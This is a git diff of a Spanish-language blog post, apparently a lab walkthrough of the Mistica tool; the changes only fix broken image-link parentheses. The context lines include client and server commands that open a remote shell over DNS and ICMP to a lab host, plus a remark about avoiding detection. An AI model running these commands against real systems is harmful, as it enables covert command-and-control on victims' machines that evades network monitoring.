@@ -312,15 +312,15 @@ Servidor:
 Cliente:
 python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:dns -w "--hostname 192.168.1.142 --port 5051 --query SOA" -k key
 
-![image133.png]({{site.baseurl}}/images/Mistica/image133.png
+![image133.png]({{site.baseurl}}/images/Mistica/image133.png)
 
 Podremos ejecutar commandos de manera remota en nuestro parrot:
 
-![image134.png]({{site.baseurl}}/images/Mistica/image134.png
+![image134.png]({{site.baseurl}}/images/Mistica/image134.png)
 
 El tráfico generado:
 
-![image135.png]({{site.baseurl}}/images/Mistica/image135.png
+![image135.png]({{site.baseurl}}/images/Mistica/image135.png)
 
 Como vemos el protocolo utilizado es UDP en vez de DNS, esto es porque hemos indicado el puerto 5051, esto llamaría mucha la atención.
 
@@ -330,15 +330,15 @@ SHELL - ICMP
 Servidor
 python3.8 ms.py -m io:icmp -s "--iface eth0" -k key
 
-![image136.png]({{site.baseurl}}/images/Mistica/image136.png
+![image136.png]({{site.baseurl}}/images/Mistica/image136.png)
 
 Cliente
 python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:icmp -w "--hostname 192.168.1.142" -k key
-![image137.png]({{site.baseurl}}/images/Mistica/image137.png
+![image137.png]({{site.baseurl}}/images/Mistica/image137.png)
 
 Y ejecutamos comandos sobre la maquina víctima a través del protocolo ICMP 😊
 
 
-![image138.png]({{site.baseurl}}/images/Mistica/image138.png
+![image138.png]({{site.baseurl}}/images/Mistica/image138.png)
 
 
